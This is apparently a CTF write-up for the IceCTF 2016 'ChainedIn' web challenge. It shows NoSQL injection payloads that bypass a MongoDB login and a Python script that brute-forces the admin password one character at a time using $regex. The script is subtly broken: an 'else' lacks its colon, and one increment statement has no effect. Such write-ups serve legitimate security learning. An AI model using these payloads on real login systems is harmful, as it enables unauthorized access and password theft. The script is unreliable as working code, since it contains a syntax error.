---
layout: post
title: IceCTF - ChainedIn [Web]
author: menztrual
tags: [ctf, icectf, web]
---

 * **Competition**: IceCTF 2016
 * **Challenge** Name: ChainedIn
 * **Type**: Web
 * **Points**: 75 pts
 * **URL**: http://chainedin.vuln.icec.tf/

<!--more-->

## Challenge Description:

> I keep getting so much spam from this website. Can you leak the admin password so I can put a stop this nonsense? I made an account for you to help you break in, the username is agent1568 and the password is agent1568


Starting the challenge off, we are greeted with a splash page with not a lot of content on it. On the bottom of the page we can see that the site is "Powered by MongoDB and AngularJS". Our response headers also show an important header: `X-Powered-By:Express`, indicating the challenge is using a [MEAN](http://mean.io/) stack.

Logging in as `agent1568`, we can't do anything apart from staring blankly at our username:



Repeating a login request in Burp, we can see 2 useful things:

 1. An incorrect login error message
 2. The request is sending JSON + content-type: `application/json header`


Testing if the login is vulnerable to [NoSQLi](https://www.owasp.org/index.php/Testing_for_NoSQL_injection), we can see we get logged in as Administrator:



So now that we've logged in as Administrator, we still don't have our flag. Re-reading the challenge description, we're asked to `leak the admin password`. Unfortunately, I'm not aware of any UNION like alternatives for NoSQL injections. However, because the password is being stored in plain text, we can utilize the messages coming back from the response in conjunction with `$regex` in our password to brute force the admin password.

By changing the password being sent in the JSON request one letter at a time and then checking the response back from the server, we can calculate the flag/admin password:

```
{"user":{"$gt":""},"pass":{"$regex":"^f"}}   -- Invalid Credentials
{"user":{"$gt":""},"pass":{"$regex":"^I"}}   -- Welcome back Administrator
{"user":{"$gt":""},"pass":{"$regex":"^Ic"}}  -- Welcome back Administrator
{"user":{"$gt":""},"pass":{"$regex":"^Ica"}} -- Invalid Credentials
{"user":{"$gt":""},"pass":{"$regex":"^Ice"}} -- Welcome back Administrator
```

As this would be a very long, repetitive manual process, I wrote the following python script to extract the flag:

```python
# IceCTF 2016 - ChainedIn Solution
# Author: menztrual - <https://thegoonies.rocks>

import requests
import json
import time

# Character map for valid characters in the flag name
charMap =  ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
            'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
            '0','1','2','3','4','5','6','7','8','9','_','{','}']

url = "http://chainedin.vuln.icec.tf/login" # URL of challenge

finished = False # Set to true when we find the end `}`
flag = "" # Starting point for our flag
print "Finding flag..."

while (finished == False):
    for i in range(0,len(charMap)):
        char = charMap[i]
        header = {'Content-Type': "application/json"}
        payload = {"user":{"$gt": ""}, "pass": {"$regex": "^"+flag + char}}

        r = requests.post(url, data=json.dumps(payload), headers=header)
        if r.status_code == 502:
            # Bad server. Delay and try again.
            time.sleep(10)
            continue
        else
            result = json.loads(r.content)
            if result['message'] != 'Invalid Credentials':
                flag += char
                i = i + 1
                print flag

                if (char == "}"):
                    finished = True
                break

            if finished == True: break

print "Finished: "  + flag
```

Flag: `IceCTF{I_thOugHT_YOu_coulDNt_inJeCt_noSqL_tHanKs_monGo}`

